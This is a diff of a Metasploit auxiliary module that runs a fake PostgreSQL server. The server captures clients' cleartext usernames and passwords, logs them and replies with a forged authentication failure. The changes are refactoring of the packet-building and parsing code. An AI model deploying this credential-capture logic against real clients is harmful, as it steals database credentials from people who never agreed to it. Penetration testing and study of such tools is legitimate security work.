@@ -15,11 +15,10 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'           => 'Authentication Capture: PostgreSQL',
-			'Version'        => '$Revision$',
 			'Description'    => %q{
 				This module provides a fake PostgreSQL service that is designed to
 				capture clear-text authentication credentials.},
-			'Author'         => 'Dhiru Kholia <dhiru at openwall.com>',
+			'Author'         => 'Dhiru Kholia <dhiru[at]openwall.com>',
 			'License'        => MSF_LICENSE,
 			'Actions'        => [ [ 'Capture' ] ],
 			'PassiveActions' => [ 'Capture' ],
@@ -64,9 +63,9 @@ class Metasploit3 < Msf::Auxiliary
 			@state[c]["status"] = :send_auth_type
 		elsif @state[c]["status"] == :send_auth_type
 			# Startup message
-			length = data.slice!(0, 4).unpack("N")[0]
-			protocol = data.slice!(0, 4).unpack("N")[0]
-			sdata = [ 0x52, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03 ].pack("CCCCCCCCC")
+			data.slice!(0, 4).unpack("N")[0] # skip over length
+			data.slice!(0, 4).unpack("N")[0] # skip over protocol
+			sdata = [ 0x52, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03 ].pack("C*")
 			c.put sdata
 			data.slice!(0, 5) # skip over "user\x00"
 			@state[c][:username] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
@@ -75,12 +74,12 @@ class Metasploit3 < Msf::Auxiliary
 			@state[c]["status"] = :pwn
 		elsif @state[c]["status"] == :pwn and data[0] == 'p'
 			# Password message
-			length = data.slice!(0, 5).unpack("N")[0]
+			data.slice!(0, 5).unpack("N")[0] # skip over length
 			@state[c][:password] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
 			report_auth_info(
 				:host  => c.peerhost,
 				:port => datastore['SRVPORT'],
-				:sname => 'psql',
+				:sname => 'psql_client',
 				:user => @state[c][:username],
 				:pass => @state[c][:password],
 				:type => "PostgreSQL credentials",
@@ -90,20 +89,17 @@ class Metasploit3 < Msf::Auxiliary
 			)
 			print_status("PostgreSQL LOGIN #{@state[c][:name]} #{@state[c][:username]} / #{@state[c][:password]} / #{@state[c][:database]}")
 			# send failure message
-			sdata = [
-				0x45, 97 - 8 + @state[c][:username].length, 0x53,
-				0x46, 0x41, 0x54, 0x41, 0x4c, 0x00, 0x43, 0x32,
-				0x38, 0x50, 0x30, 0x31, 0x00, 0x4d, 0x70, 0x61,
-				0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x20, 0x61,
-				0x75, 0x74, 0x68, 0x65, 0x6e, 0x74, 0x69, 0x63,
-				0x61, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x66, 0x61,
-				0x69, 0x6c, 0x65, 0x64, 0x20, 0x66, 0x6f, 0x72,
-				0x20, 0x75, 0x73, 0x65, 0x72, 0x20, 0x22
-			].pack("CN" + "C" * 56) + @state[c][:username] +
-				[ 0x22, 0x00, 0x46, 0x61, 0x75, 0x74, 0x68, 0x2e,
-				0x63, 0x00, 0x4c, 0x33, 0x30, 0x32, 0x00,
-				0x52, 0x61, 0x75, 0x74, 0x68, 0x5f, 0x66,
-				0x61, 0x69, 0x6c, 0x65, 0x64, 0x00, 0x00 ].pack("C" * 29)
+			sdata = [ 0x45, 97 - 8 + @state[c][:username].length].pack("CN")
+			sdata << "SFATAL"
+			sdata << "\x00"
+			sdata << "Mpassword authentication failed for user \"#{@state[c][:username]}\""
+			sdata << "\x00"
+			sdata << "Fauth.c"
+			sdata << "\x00"
+			sdata << "L302"
+			sdata << "\x00"
+			sdata << "Rauth_failed"
+			sdata << "\x00\x00"
 			c.put sdata
 			c.close
 		end
